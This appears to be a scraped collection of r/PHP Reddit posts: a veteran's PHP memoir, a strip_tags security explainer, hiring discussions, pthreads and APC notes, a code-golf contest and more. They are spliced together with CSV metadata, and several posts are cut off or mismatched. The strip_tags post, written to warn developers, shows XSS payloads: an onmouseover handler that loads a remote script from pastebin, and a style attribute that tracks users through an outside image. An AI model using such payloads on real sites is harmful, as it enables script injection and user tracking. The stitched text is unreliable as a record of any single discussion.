I was 14 years old, a freshman in 9th grade in high school.

I was lurking one day on Usenet Perl forums when I saw an announcement about the release of PHP 2.0/FI, the first truly public version of PHP.  I was growing weary of trying to get PERL working via CGI and fell in love immediately with how simple and fault-tolerant mod_php with Apache was compared to CGI hell.

In 1996, they didn't have sites like reddit when I was a noob. They didn't even have Google when I first learned PHP (years before google existed).  Hell! php.net's search functionality barely worked. I don't remember there be any real documentation until after PHP 4 came out in mid-2000.

There wasn't a single PHP IDE for about 5 years, and PHP did not have debugging support at all.

----

How did I learn? I went to the bookstore and poured over books (at least in the PHP 3 and 4 days). When I started with PHP/FI 2.0, I literally had to work off of the few tutorials I could find online (via webcrawler, remember that?), Usenet, and by talking to people on the PHP mailing list and on IRC. 

I haunted IRC for a decade helping people out, actually (mostly #php on Undernet from 1997-2003, then ##php on freenode back in 2003).

----

Hell, I created one the first command line PHP apps (in PHP 3, then 4, then 5).  It was a daemon that spoke the entire IRC RFC; it acted as both a server and a client, as a DCC fileserver, you could issue it commands via a web page, PHP-GTK+ client, SSH, Telnet, /msg in IRC or even secure DCC Chat.

At one point it turned into a major file sharing facilitator on Undernet, fielding about 1 TB of file names, metadata, and who shared what on which channel.  It would monitor all the text on as many IRC channels as my 56k baud modem and 600 MHz AMD Thunderbird could handle (more than you'd think, but not much), and when it saw someone's share script advertise their file list, it would ask for it, download it from them (via XDCC), parse it, and store the file information and such into a MONSTEROUS database w/ literally millions and millions of rows.  

It would also accept /msgs from users of the type: /msg phpbot @search file*pattern.  The bot would then /msg them back telling them the top 5 locations (channels, nicknames, filenames) and they woudl go there and use the info to fetch it. At its heydey thousands of queries would come in every minute, putting great load on my 600 MHz.

That's how I learned how to optimize SQL tables and queries, handle massive load, and smartly cache in an age before APC and memcache were even dreamed of with problems that were pretty much nothing but long tails.

The name of it is PHP-Egg, I started it with Linda Pederson back in early 2000 and even tho I last dev'd it in 2003, it still has some active users (wtf?) http://sourceforge.net/projects/phpegg/  The project largely died on 9/11/2001 when I last heard from Linda; i've always hoped she's ok.

Between the days of the Napster and Audiogalaxy diasporas and the rise of ED2K and bittorrent, IRC sharing was where it was at and copies of PHP-Egg helped facilitate that.

----


How did I find the function I wanted?  I had three good books with good indexes. I would pour over the index, find the function name, go to that page, and find out how to type.


This current generation of neophytes who can't even bother to google something is really really scaring me when it comes to our future prospects as a civilization.

----

I'm now 30 years old. I've been programming almost continuously and exclusively in PHP, SQL, and JavaScript for 53% of my entire life. HTML (and later CSS) since I was 12 (I bought my first domain name ""wakeup-people.com"" in 1992 when I was 12 for (I think) $250).

I used to think I had it all figured out. That was 2003; I had been a PHP program for 7 years. Then I was humbled... again and again.

I'm still humbled. Continuously.  I look code I wrote 6 months ago and I'm ashamed. Code written a year ago appalls me.  I talk with other developers I really respect and we share the same sentiments.

It's a good metric: If you aren't ashamed of what you wrote 6 months ago, you aren't progressing as much as you should.

1324340915.0,145,self.PHP,nj5t0,What everyone should know about strip_tags(),167,22,44,http://www.reddit.com/r/PHP/comments/nj5t0/what_everyone_should_know_about_strip_tags/,"**[strip_tags](http://www.php.net/manual/en/function.strip-tags.php)** is one of the common go-to functions used for making user input on web pages safe for display. But contrary to what it sounds like it's for, strip_tags is ***never, ever, ever*** the right function to use for this and it has a lot of problems. Here's why:

1. It can eat legitimate text. It turns ""*This shows that x&lt;y.*"" into ""*This shows that x*"", and unless it gets a closing '&gt;' it will continue to eat the rest of the lines in the comment. (It prevents people from discussing HTML, for example.)

2. It doesn't prevent typed HTML entities. People can (and do) exploit that to bypass word filters &amp; spam filters.

3. Using the second parameter to allow some tags is 100% dangerous. It starts out innocently: someone wants to permit simple formatting in user comments and does something like this:

` `

    $message = strip_tags($message, '&lt;b&gt;&lt;i&gt;');

But attributes on tags aren't removed. So I could come to your site and post a comment like this:

    &lt;b style=""color:red;font-size:100pt;text-decoration:blink""&gt;hello&lt;/b&gt;

Suddenly I can use whatever formatting I want. Or I could do this:

    &lt;b style=""background:url(http://someserver/transparent.gif);font-weight:normal""&gt;hello&lt;/b&gt;

Using that I can track users browsing your site without them or you knowing.

Or if I was particularly evil, I could do something like this:

    &lt;b onmouseover=""s=document.createElement('script');s.src='http://pastebin.com/raw.php?i=j1Vhq2aJ';document.getElementsByTagName('head')[0].appendChild(s)""&gt;hello&lt;/b&gt;

Using that I could inject my own script into your site, triggered by somebody's cursor moving over my comment. Such a script would run in the user's browser with the full privileges of the page, so it is very dangerous. It could steal or delete private user data. It could alter any part of the page, such as to display fake messages or shock images. It could exploit your site's reputation to trick users into downloading malware. A single comment could even spread across the site rapidly, virally by submitting new comments from the user who views it.

You can't overstate the danger of using that second parameter. If someone cared enough, it could be leveraged to wreak total havoc.

The second parameter doesn't work decently even for known safe text. Usage like `strip_tags('text in which we want line breaks&lt;br/&gt;but no formatting', '&lt;br&gt;')` still strips the break because it sees the '/' as part of the tag name.

---

If you simply want to prevent HTML and formatting in user-submitted input, to display text on a web page exactly as typed, the correct function is **[htmlspecialchars](http://www.php.net/manual/en/function.htmlspecialchars.php)**. Follow that with **[nl2br](http://www.php.net/manual/en/function.nl2br.php)** if you want to display multiple lines, otherwise the text will appear on one line. (++Edit: You should know what character set you're using (and if you don't, aim to use UTF-8 everywhere as it's becoming a web standard). If you're using a weird not-ASCII-compatible character set, you must specify that as the second parameter to htmlspecialchars for it to work properly.)

~~For when you want to allow formatting, there are proper pre-designed libraries out there for allowing safe use of various syntaxes, including HTML, [Markdown](https://secure.wikimedia.org/wikipedia/en/wiki/Markdown), [BBCode](https://secure.wikimedia.org/wikipedia/en/wiki/BBCode), and [Wikitext](https://secure.wikimedia.org/wikipedia/en/wiki/Wiki_markup).~~

For when you want to permit formatting, you should use a proper library designed for doing this. [Markdown](https://secure.wikimedia.org/wikipedia/en/wiki/Markdown) (as used on Reddit) is a user-friendly formatting syntax, but as flyingfirefox has explained below, it allows HTML and is not safe on its own. (It is a formatter and not a sanitizer). Use of HTML and/or Markdown for formatting can be made fully safe with a sanitizer like **[HTML Purifier](http://htmlpurifier.org/)**, which does what strip_tags was supposed to do. [BBCode](https://secure.wikimedia.org/wikipedia/en/wiki/BBCode) is another option.

If you feel the need to make your own formatter, even a simple one, look at existing implementations to see what they do because there are a surprising number of subtleties involved in making them reliable and safe.

---

The only appropriate time to use strip_tags would be to remove HTML that was *supposed* to be there, and now you're converting to a non-HTML format. For example, if you have some content formatted as HTML and now you want to write it to a plain text file, then using strip_tags, followed by [htmlspecialchars_decode](http://www.php.net/manual/en/function.htmlspecialchars-decode.php) or [html_entity_decode](http://www.php.net/manual/en/function.html-entity-decode.php) will do that. (In this case, strip_tags won't have the flaw of removing legitimate text because the text should have already been properly escaped as entities when it was made into HTML in the first place.)

Generally, strip_tags is just the wrong function. Never use it. And if you do, ***absolutely never use the second parameter***, because sooner or later someone will abuse it.",,False,,t5_2qh38,True,,,True,t3_nj5t0,http://www.reddit.com/r/PHP/comments/nj5t0/what_everyone_should_know_about_strip_tags/,

1322067935.0,122,self.PHP,mmvn2,Having trouble finding quality PHP employers: A rebuttal.,146,24,40,http://www.reddit.com/r/PHP/comments/mmvn2/having_trouble_finding_quality_php_employers_a/,"Yesterday, [this thread](http://www.reddit.com/r/PHP/comments/mlpeg/having_trouble_finding_qualified_php_web/) created quite a bit of controversy in this subreddit, and there were a lot of great comments, so I wanted to try to do my best to consolidate some of them and add my own comments.

**1\.** If you want the best candidates, you have to be the best employer. No one with high qualifications (like the ones demanded in the previous thread) and years of experience wants to work for a no-name company with no reputation. Sure, a lot of younger computer science grads can be enticed to start-ups when they're right out of college with promises of equity and a chance to make it big, but if you have no big names behind you and no venture capital, I wouldn't even give you a second glance. (Personally, I've written start-ups off my list altogether, as I have no desire to work 80 hours a week for a company with little direction that will most likely fizzle out in a few years.) 

If your company is established, it's also better if it's in a promising industry. I'm also familiar with the Southern California job market; a lot of companies hiring right now are either in the entertainment industry (sell my soul to the RIAA/MPAA?) or they're one of those content-generation outfits (no thanks). Your company must be doing work that is intellectually engaging and at the forefront of creativity. No one with a MS in CS, with advanced PHP knowledge, is going to help you develop Wordpress plugins all day. No one.

**2\.** If you want the best candidates, you must pay them as though they were the best candidates. For the Southern California market, for PHP developers, this means in the $110k - $125k+ range. If you want people who are already working, you have to make it worth it to them to change their jobs. And once you're willing to offer these salaries to the point where your ideal candidate would consider relocating to near your offices, you have to compete against the more prestigious companies to which a candidate could also relocate. Google, Microsoft, and Yahoo are all in LA. Can you offer a better workplace, more benefits, more perks? I doubt you can, but if you want to get the best candidates, you must.

**3\.** If you're a recruiter, and you're looking for workers for another firm, you **must** disclose that firm and the salary range in the job listing to get any kind of high caliber workers. I'm not going to send my resume to your company just to find out which company the job is for. Actually, I'm not going to contact you at all.

**4\.** Specifically to the hiring manager in the previous thread: If you want a computer scientist, you're asking the wrong questions. Demonstrating knowledge of ""gang of four"" design  patterns, while essential, is trivially easy. There are a million examples on the web, even for PHP. There's a reason there aren't any programming challenges that fall along the lines of ""demonstrate inheretance and abstraction.""

Instead, if you want to get to the bottom of a person's computer science knowledge, ask the candidate about his knowledge of data structures and algorithms. Ask him some simple [computer science puzzles](http://www.codinghorror.com/blog/2007/09/classic-computer-science-puzzles.html) (you don't necessarily need a solution, just ask what kind of approaches they would take to the problem, or how they would represent the data). If they can answer questions like that, chances are they understand when to use the `static` keyword and when not to. When a candidate demonstrates knowledge of things like these, whether they know *the new stuff* in PHP 5.3 is trivial, because if they don't know it, they will pick it up immediately.

**5\.** The original post doesn't mention anything about intangible skills (this was probably intentional, as it was technically oriented). It doesn't mention the candidate's ability to function as a team, communicate effectively verbally and written, offer constructive ideas and criticism when necessary. I've never worked in an environment where those weren't critically important to the overall effectiveness of the team. The original post OP said he didn't read resumes; the resume is one of the best ways to tell if a candidate can form a sentence, construct ideas, and get across a cogent point. Why in the world would you not read resumes? You're hiring developers who need to communicate, not trolls who will sit in a dark dungeon all day not speaking (at least I hope not).

**6\.** And for the love of all that is holy, **please** do not use the words *ninja*, *rock star*, or *guru* to describe the position.

Many thanks to philsturgeon for contributing these hints that might not be too obvious at first glance: (this was in response to an outdated webpage I posted earlier)

* Never use ?&gt; to close up a file. One person commits with Windows line endings instead of Unix line endings, or has a IDE that adds a NL for no reason, or whatever and BOOM you've got random whitespace breaking your sessions and logging your users out. That's no fun.

* Filter var is terrible at validating emails.

* Not mentioning Composer is concerning. He instead suggestions you handle your dependencies with require_once('phpmailer-5.1/class.phpmailer.php');

Am I expecting too much?",129,34,451,http://www.reddit.com/r/PHP/comments/1hjnb9/trying_to_hire_lamp_devs_and_theyre_all_flaking/,"We've been trying to hire a pair of LAMP devs (either a junior/senior pair or two mid-levels) for a few months now, and haven't had much success.  We've phone screened about fourteen, all but one of whom we wanted to bring in for an in-person interview.  Between the phone screen and the in-person, we issue a coding task if the user doesn't have any published code samples.

We've gotten three -- *three* -- tasks back.  One was amazing, but someone else hired him before we should send an offer.  One was from someone that *claimed* to be a ""senior"" dev, but who made some huge mistakes that any junior to low-mid level dev should know not to make.  The third was from an internal candidate that had never touched the LAMP stack in his life, so it was a trainwreck, but an *amazing* trainwreck.

All of the other devs have come up with some *excuse* to not complete the code task within the week we usually give.  Some are very straightforward and honest, like the guy that withdrew after saying that he didn't think he actually had the skill to complete it.  Some got *weird* and dropped interesting things like ""oh, well, that offer on the house came through so I'm not gonna be moving"" or the ""senior"" guy that said ""you can't seriously believe that this task will only take two hours, this is gonna take me eight to ten!""

Let me summarize the task.  Some requirements have been changed to protect the innocent.

1. Design a database schema to store your personal book collection.  You need to keep track of *at least* the title of each book, the author, the genre, the publishing year, and the publisher.  You may add additional fields as you see fit.
2. Create three queries against the schema
  1. All books, sorted by author, publisher, then release year, showing the author, publisher, year, and book title.
  2. All books, grouped together by genre, showing title and author.
  3. All authors and their total book and genre counts.  Do not use COUNT(DISTINCT ...).
3. Create a small PHP application to display the results of the three queries, with users switching between them using XHR.  Do not use any third party code (frameworks, libraries, etc) *other* than something to do the XHR, with a preference towards Prototype instead of jQuery.

In all the *seven* years that we've given this task, we've *never* had such a problem with it.  Is it *really* that arduous?  Shouldn't any PHP dev that dares call herself a dev be able to finish this task with relative ease?

To be clear, nobody has ever ""passed"" the test (not even me!), because we aren't looking for pass/fail.  We're looking for people that think the problem through and design sane code.  The way that their schema is designed is a huge tell. 

- Did they think about the fact that a book can have multiple authors and genres? (Sometimes) 
- Better yet, did they ask about that oversight in the spec? (Never) 
- Did they achieve Third Normal Form?  (Usually)
- Did they use foreign keys?  (Almost never)
- Did they pull off the third query without resorting to doing a loop in PHP? (Never) 
- Did they pick something other than jQuery to do XHR? (Almost never, despite our obvious preference for Prototype due to in-house use) 
- What's their PHP look like? 
- Did they separate business logic from display logic? (Usually)
- Did they use OO or did they keep it procedural? (Usually procedural, sometimes OO)
- If they used OO, did they do it for the sake of OO, or did they do it because the application demanded it? (50/50 useful vs OO-wankery)
- Is the code clean, straight-forward, followable and readable? (Usually)
- What's their commenting style? 
- Did they create unit tests? (Someone did this once!) 

Etc, etc.

Are my expectations too high?  Is this task really that demanding?  Keep in mind that we only issue this task when the applicant *doesn't* have published code samples... and we've only had that happen once so far.  We're thinking about switching the timing on the task so it's done *during* the interview so that the applicant *can't* flake out.  The schema can be whiteboarded, so can the queries...

------

e: So it's pretty clear from the comment votes that a lot of people think that this task is excessive, while the minority think it's fine.

I really like working with PHP, but at every web development conference I go to it seems like it's a forgone conclusion that PHP is horrible to the point where presenters don't even mention it as a viable language to use to build web applications. I just got done with a day long event today and it was the same. Presenters wanted a show of hands of what we were using. ""Python? Ruby on Rails? .NET? Scala? Perl? Anything else?"" I raise my hand and say PHP and the presenter literally gave me condolences.

Seriously? How the hell is PHP not like the first or second option? With all the major sites and CMSs out there in PHP and Scala is mentioned before PHP??

I realize some technologies are easy to use poorly but I've found PHP to be absolutely great with a framework (I use Zend) for application development and fantastic for small scripts to help me administer my servers.

What am I missing here? I find it annoying and rude, especially considering how crucial PHP has been for the web.

This only makes sense if you intend to output data at the end of the script. Unless you do, skip this closing tag. The parser is happy with this, it has no caveats and the best thing that can happen if you add it is that you might output unintended white-space.

Then i decided to move into programming. I learned php 4 and i began to create my own cms which lead me to work mantaining software in a company back home.

I've been working the last 5 years developing in php with a custom framework from the company. 

I learned about databases: MySql, Postgresql, Oracle and Others.

Some of the fun was in all those new js frameworks like JQuery and Dojo.

Now in my thirties, im in that point in which i need to update heavily my knowledge.

- In the old days, you dealt with browsers. Now you also deal with diferent plattaform and devices.
- Ten years ago you got away with some spaghetti code and procedural approach. Today you have Object oriented code, Design Patterns, MVC and frameworks. Well and also the latest PHP functionality
- Photoshop used to be enough to make decent graphics. Now design has to be adjusted to grids and responsive design
- Php used to be enough for most of web application development. Today we have Python, Ruby, and things that goes beyond php like all the frameworks CI, Cake, Zend, Symphony
- What used to be just flash, now is done with html5 or adobe air.
- Now we have NoSql databases

So right now i need some advice because im kind of lost facing so many possibilities.

I want to learn the MVC approach, but i think that doing it by learning a different language (like ruby) will help me to increase my knowledge and being able to work with CI, Cake, Zend or Symphony more naturally.

What should i focus first? web design tools? frameworks? mobile programming? NoSql databases?

I like to do both. Web and applications

1. Clicking on a value allows you to inline edit, at the cost of being able to select multiple rows easily (since selecting a row means having to click on the actual checkbox instead of anywhere on that row)
2. The inline editing is pretty terrible, throws alert boxes occasionally, and actively will NOT update the value if the value has changed in the meantime (which I suppose is a feature, but is counter-intuitive user behaviour. If I want this column to be a certain value, set it to that value!)
3. They now use jQuery to enhance their UI, although to be honest, I had no problems with their UI before.
4. Loading the jQuery javascript library EVERY SINGLE PAGE slows the app down considerably, especially since I have my browser cache disabled with the Web Developer Toolbar. (**Note**: Although as [ivosaurus](http://www.reddit.com/user/ivosaurus) points out, this is mostly a problem with me, and not phpMyAdmin)
5. The inline editing box has syntax highlighting, and some js scrolls the browser window horizontally for you, but the js autodetect is off, and starts scrolling the window before you have reached the edge. This has two main concerns... Firstly, what's wrong with letting the browser scroll the window on edge detection? Secondly, as a user, *I never want horizontal scrolling!!!* Once I type out my query, I have to grab my mouse and click the scrollbar in order to hit the ""Run"" button.
6. When running an `ALTER TABLE` query using the SQL page, the page sometimes locks up (most likely waiting for an ajax call to return with status...?)
7. The table creation is sequestered into its own modal, but only if you create less than a certain number of rows, otherwise, it falls back to its own page. *(-- [Draders](http://www.reddit.com/user/Draders))*
8. Occasional [empty error messages](http://i45.tinypic.com/4py3qb.png). *(-- [Kenwag](http://www.reddit.com/user/kenwag))*

Some other irregularities:

1. No foreign key support (or if there is, I can't find it!)

Mainly, phpMyAdmin, leave my UI alone! It's great that phpMyAdmin can do inline editing (which has become useful on more than one occasion, I will admit), but it seems as though with evey new version, there are one or two new ""features"" which invariably break old behaviour, or are not UI optimized.

The only positive I can find:

1. CSS enhancements - I have no problem with this, this doesn't slow down my work, and it looks decently pretty.

UI bugs I can deal with, but if phpMyAdmin trashes my data, that's probably the last straw...

What are your opinions? At this rate, I am afraid to upgrade to a new version...

1375599564.0,75,self.PHP,1jo517,Multithreading in PHP with pthreads,93,18,68,http://www.reddit.com/r/PHP/comments/1jo517/multithreading_in_php_with_pthreads/,"Many of you are beginning to notice pthreads, unfortunately the people writing about pthreads and concurrency in PHP are not well equipped to provide advice, to tackle this I have decided to reddit about some misconceptions I have come across ...

1) PHP is not thread safe, there are lots of extensions that will give your application cooties.

In reality this hasn't been true for a very very long time. TSRM has been discussed and explained in other threads on reddit, the fact is that PHP does support multi threaded execution of the interpreter and has done for 13 years, a lot of effort is made to ensure that at least internal and bundled functionality doesn't do anything stupid when executing in a ZTS environment. pthreads creates contexts for execution just as the Apache Module does using a worker mpm.

2) pthreads is old fashioned

The pecl extension pthreads and Posix Threads are not nearly the same thing, posix threads are brilliant but complex, pthreads is just brilliant ;)

pthreads does not mean Posix Threads when we talk about php, it means php threads, but php threads is a crappy name ... pthreads !== Posix Threads, no where near it ...

3) pthreads does not include everything you need to execute safely

Simply wrong; as it says in the documentation, it includes all you need to write truly multi-threaded applications in PHP. Operations on the object scope are implicitly atomic, safety is ensured, all the time ... 

4) pthreads unsafely shares memory among contexts in order to provide concurrent functionality

Again, wrong. PHP is a shared nothing architecture and the Zend MM prohibits contexts from writing each other during execution, that's what makes things like Apache 2 module work in multi-threaded mode without strangeness at the interpreter level. The fact is that even if you pass data to a function that in turn uses that data in a non-reentrant way, it will make absolutely no difference because the data you pass is always a copy; pthreads utilizes copy on read and copy on write to maintain the shared nothing architecture and keep sane the executor.

5) pthreads is beta and should be avoided at all costs

I marked pthreads beta because of what it is. Lots of people are using pthreads in production and I've been asked multiple times to change the status of the extension such that network managers will allow devs to install it.

One day, pthreads will be marked stable, since all the kinks are nearly worked out that should hopefully be in the next few releases. Until then, beta doesn't mean unusable, it means that you may experience an error or the unexpected, those that have read documentation and examples should have less problems, and everyone should report every bug they find either on bugs.php.net or github.

Multi-threading in PHP sounds like some sort of voodoo, for so long it's been something that was either impossible in the minds of php programmers, or a bad idea to try and emulate. pthreads doesn't emulate anything, it leverages bundled functionality and the object API to provide true userland multi-threading.

I encourage anyone looking at pthreads to read every single example included, and take good note of the documentation, it will be beneficial to scan the documentation through before you start. I'm aware PHP programmers aren't used to having to read the instructions, but, we are pushing the envelope, there isn't a million ways to do everything as there normally is in PHP, there is a single, correct way to do things, and they are pretty well documented by now.

Historically, lack of decent APC support is the thing that slows down the uptake of new versions of PHP in the real world. Decent support for APC was difficult to maintain, there aren't many with enough knowledge, the edge cases crept further inwards with every major version of PHP.

Opcache is now part of the PHP core, it will always be shipped with PHP, thus rendering (most of) APC useless. This poses a problem for those of us who make use of APC's user caching capabilities, as Opcache comes with no such facility - and it won't either.

Before you go thinking ""I'll just use memcached or redis"": everything has it's place,  when you send a value to memcached or redis or __insert key/value store here__, the data is converted into a type/format native to your software, when requested, it is then converted from the stored value into a type Zend understands. While each implementation of a key/value store may have benefits APC doesn't have, none of them have one key benefit: APC talks the language of Zend; when you send a value to APC, it is bitwise copied, same type/format into the store, when you request it again, it's bitwise copied out. This doesn't apply to objects, you shouldn't be caching those anyway, that's a whole 'nother article ... so think carefully about the impact of swapping out APC for anything else ...

Onto your options ... when it became apparent to us that PHP would be left without a user cache, some of us (two, actually) jumped into action to solve this. I decided it would be best to salvage the very very reliable APC codebase and remove everything opcode, APCu was born. APCu is APC without opcode caching, it has a full backward compatibility mode and should not require changes to software. Laruence, a very very gifted programmer, devised a very clever cache named YAC, this is a lockless (theoretically very fast indeed) cache, lockless has implications that are too boring to talk about, if you think you know what those implications are then take a look at it and do your own testing, as a community we are waiting for feedback on YAC.

What's so great about opcache, why didn't we merge APC into the core: APC has maintenance issues, that aside, Opcache is a better opcode cache and provides the additional benefit of being able to optimize your stored opcodes, always executing the optimized ones. We'll not go into what optimizations are done ... Opcache has a much simpler allocator than APC, very suitable for an opcode cache (not at all for a user cache), this makes it hungrier for RAM than APC in most setups, but who really cares about that, just make sure you do your homework before you deploy !!

He had a function for category. He had one for subcategory. He had one for brand name. He had one for category and brand name. He had one for subcategory and brand name... you get the point. To make matters worse, each function has an obscure name and the page's logic is also littered with various combinations:

After all of this I got my first job in the field as a web developer and I finished my project.  It is a social networking site for students to connect by campus, major and courses called [Openleaf](http://openleaf.me). It requires registration so if you did want to see what I have accomplished without signing up I made a short [screencast](https://www.youtube.com/watch?feature=player_embedded&amp;v=KgqCTrnb2Oo).  The site has been live for a little over a month and has 1,100ish users as of now.  It even got some attention in the [local media](http://www.actionnewsjax.com/content/topstories/story/UNF-students-create-social-website-for-college/wZ-fCn2kFEunvo6VG_tMdw.cspx)!  

Thank you again everyone for your assistance and for putting up with me.  Between the help I have gotten and the knowledge I have picked up from other posts here, /r/PHP has been probably the single greatest resource for me while I learned PHP.

Here's a link to the top 10 submissions. their usernames are in the function name

http://codepad.org/rU7Fxts0

---------

I've done some one-liner challenges before and some people enjoyed them so im going to try another contest.  This time minus the one-liner part...that part seemed to cause arguments on the definition of a one-liner.

**Rules**
----------

Given a hand of cards in the format

    array( '2c', '6d', 'as', 'jh', '10c' )

determine if the hand contains a straight (straight flush counts too).

PM me your code in the format:

    function check_straight( $hand ) {
        //Your code here
    }

Least number of characters in a working function wins

**Notes:**

* I have error reporting set to E_ALL. No notices/warnings etc... can be thrown.
* I will be testing the code on PHP 5.3.6
* [Here is a function to generate a hand](http://codepad.org/4w3GmGIo)
* Aces are high **AND** low
* You must minify your own code, im just going to select the code to count the characters with my text editor
* I have a working solution
* As people send me working solutions i will post their character count as edits.
* **A straight flush should return true as well**
* Input parameter must stay `$hand`
* 10 cards are 3 characters ( 10h, 10c, 10s, 10d )
* **NO USING @**
* Deadline is may 10th at 12pm noon PST

Winner gets 3 months of reddit gold.

I've been told that I teach people in a way that is easier to grasp than what's conventional and I would like to get other peoples opinions on how to produce code and perspectives when you're not native to PHP specifically.

I need to find how I can teach this class doing a webcast, and also have a way to allow people to ask questions and answer them as I go through the lessons. There is also the issue of multiple environments (windows/*nix) and I would like to know how the PHP community here prefers their working environments and editors.

My preference is working on Mac OS X with MAMP and Sublime Text 2 as my main editor.

-- Edit --

I forgot to say what my experience is. I've been working with PHP for approximately 6 years now. I've worked with quite a few startups and am currently a lead developer on a PHP based database front-end. I've been working with PHP since the start of PHP 5 (learning PHP 4 in it's very latest stages) and have learned all the wrong ways to program in the time. I now develop for PHP 5.3 and am familiar with PHP 5.4 syntax and how to better software with the improvements.

Here is a basic registration form: http://eepurl.com/nSvo5

You won't get spammed, I promise. I am only going to use it to notify you by email when I start the classes. They should begin sometime in the beginning of August.

I'm also going to start an open-source project in the next two weeks leading up to it, and I will use it as an example. To all of the experienced PHP devs, please point out how I suck as a developer :) I enjoy when I get feedback. haha

It prompted some great discussion, and even had us mods privately waffling on our opinions of the matter. :)

The response, however, is somewhat clear. While a great many of you came out in support of a more ""free speech"" approach to moderating content, a greater number voted to disallow the posting of advice animals, rage comics and whatnot.

By the last count, the vote was 174 votes to prohibit, and 146 votes to permit. Even with the anti-spam fuzziness, the result is clear by a margin of 28 votes (8.75% of the total number of upvotes).

So, for now at least, meme posts will be prohibited in /r/PHP. This doesn't mean that memes are prohibited in the comments, or that we're now prohibiting humorous posts. All it means is that any link posts involving advice animals, rage comics, or similar content that we deem to be a ""meme"", will be removed. No punishment will be meted out (unless someone's spamming them to troll); the post will just be removed.

The reason for this is that im a self-taught programmer; I have no schooling. I've never been part of a team.  I've been a lone programmer for a long time. Id like to have someone else look through my code and give me their ideas.

This is a library i've created for fun, it just happens to be the latest example of my work. Thats why im picking this specific library.

I figured id reach more people if i posted in here rather than /r/forhire.  To make it more related to PHP, and not just me, ill post a link to the library and the persons comments afterwards.

So im looking for interested people to post a link to examples of their work so i can choose someone for this.  Ill send half the money up front and half upon completion.

**EDIT**

A bunch of people are offering to look it over for free.  So I've decided to post the link here and donate $50 to St Jude Children's Hospital.

Here's the library

http://www.reddit.com/r/PHP/comments/1h63d3/entrylevel_php_job_interview_help/

I followed pretty much all of the advice you guys gave me. So here's the update, and I hope it isn't too verbose.

The interview consisted first of a spoken question and answer session. The first thing they said was, ""Tell us about yourself."" It might seem crazy but I was totally unprepared for that broad of a question. I was dumbstruck, visibly nervous, and just went silent for like 10 full seconds. Then I took a sip of water and managed to give them a pretty decent response, which was like a 3-minute version of my life story as it relates to programming and technology.

Once they responded favorably to that 3-minute bio, I wasn't really nervous anymore. They started interjecting with stuff from their lives that I related to, it started to feel like a simple conversation, and these guys seemed just like me.

They went on to ask a lot of questions about technology. What languages I've worked with, what does AJAX stand for, what is MVC, what are the advantages of object-oriented programming vs procedural programming, etc. I seemed to have at least a cursory knowledge of pretty much everything they asked me about.

After that was a written test (pen and paper). My handwriting is just awful, so I started to get really nervous again. I had also never hand-written code on paper before. Super super nervous about the whole handwriting with permanent ink thing. Luckily the questions dealt mostly with things I had already done before.

Then I got a tour of their facilities. This is when I started to think I might get the job, because generally I don't think bad interviews end with a tour.

The whole process lasted about 2.5 hours.

On my drive home I was thinking about some answers I gave on the written test, and realized I had made a mistake (forgot to unset() some variables in a for loop). So the next day, I sent a thank you email, and took that opportunity to correct my mistake.

A few minutes after I sent that email, I got a response asking to schedule a phone call. A short while later, I got a phone call, and was offered the job.

The commute was a killer (doable, but a killer) so I decided to relocate to Anaheim. [Here's the view from my new apartment's courtyard balcony.](http://i.imgur.com/plxNaqL.jpg)

Starting this Wednesday, I'll have 40 hours a week devoted just to software. Getting paid will be great, but I get most excited when I think about what this experience could do for me in terms of growing my skillset and mastering PHP. Since I was very young, I've always admired great software developers, and I see this as my opportunity to become one of them.

So, this presents me another opportunity to ask /r/php for advice.

I've been told the first thing they're going to do is get me familiar with Magento, the e-commerce framework written in PHP. I plan on spending a day or two on it before I go in for the first day of work. Do you guys know of any good resources for someone new to Magento?

And for a more broad question, what can I do to make sure the first few weeks of work go as smoothly as possible for me?

If you work IT in an office setting, what are some things new employees have done that have gotten on your nerves or gotten them fired? What are some things new employees have done that made you view them more favorably?

I'm nervous, but it's the good kind of nervous. Exceeding my future boss' expectations of me is extremely important to me, so any advice in that vein is greatly appreciated. And thanks again everyone for helping get me through the interview.",,False,,t5_2qh38,False,,,True,t3_1i9e0q,http://www.reddit.com/r/PHP/comments/1i9e0q/entrylevel_php_job_interview_help_update/,

1347052614.0,54,self.PHP,zixee,Can We Revive php.net User Notes Or Kill It?,70,16,51,http://www.reddit.com/r/PHP/comments/zixee/can_we_revive_phpnet_user_notes_or_kill_it/,"I'm sure most avid browsers of the PHP manual on php.net are aware of the **user notes** feature that has been on the site since it's existed. We can still find notes on there dating as far back as 14 years or more.

[See the oldest user note still around on php.net today](http://us.php.net/manual/en/function.reset.php#48)

The question, however, has always been ""how useful is this feature really and does it bring more harm than good?"". It's not that easy to answer since there are so many notes submitted by a wide range of users and some will likely go unnoticed while others seem to get undue attention due to their positioning near the top of the user-notes section of a particularly trafficked page. For example, the ""date"" function seems to get a disproportionate amount of traffic on php.net compared to all other functions. Yet, it only holds 31 notes as of today whereas a function like *strtotime* has **123 notes*** currently listed. There seems to be no obvious pattern as to why people find it compelling to submit a user contributed note to php.net for one particular page over another.

The code for the user notes system is pretty old and quickly withering away due it's old age. I've spent some time over the past few weeks to try and see what I can do to revive it a bit and perhaps introduce some new useful features that might help bring it back to life. I started with offering features that have been demanded since long before I showed up.

* Voting - (Users can now vote notes up or down)
* Flagging - (Users can now notify a moderator when something is wrong)
* Sorting - (Notes can be ordered by their popularity and integrity as opposed to age)

These are just a few of the improvements I started with. The current system leaves a lot to be desired, but there are also some grave technical challenges in the way that prevent me from being able to easily introduce a more useful and powerful system.

For one, the current php.net setup doesn't allow an easy way for users to actually register or login to the site and as such no one is held accountable for what they post to the user notes section. One proposed solution has been to offer up OAuth 2.0 as a way for users to contribute while still having some means to prevent spam and other abuse. Though OAuth 2.0 is still questionable in terms of security and it's implementation still leaves us with considerable challenges to overcome since php.net has over 100 mirrors and no real centralized means of backend integration that's prepared to thwart off abuse.

Despite all of these challenges and short-comings, however, I cannot stress enough how much user notes have actually made some impact on the community in general. Notes have gotten over 100,000 submissions since their birth. Their original purpose was to server improving the documentation. If a note provides something the documentation missed, or doesn't cover clearly enough it should be integrated into the manual. Notes can provide corner-cases that aren't always noticed until the feature gets used and abused by the community and someone discovers an edge case the documentation hasn't accounted for. Notes seem to have also started some code repository on php.net that I'm not entirely certain is helpful, but regardless some people tend to find some *diamond in the ruff*, if you will, every now and then.

A simple demonstration of these features can be tested out here: (http://php.sheriframadan.com/manual/en/function.strtotime.php#109929)

I'm not sure what the answer is to be honest, as to what we should do about user notes on php.net, but I'd love to hear all of your opinions.

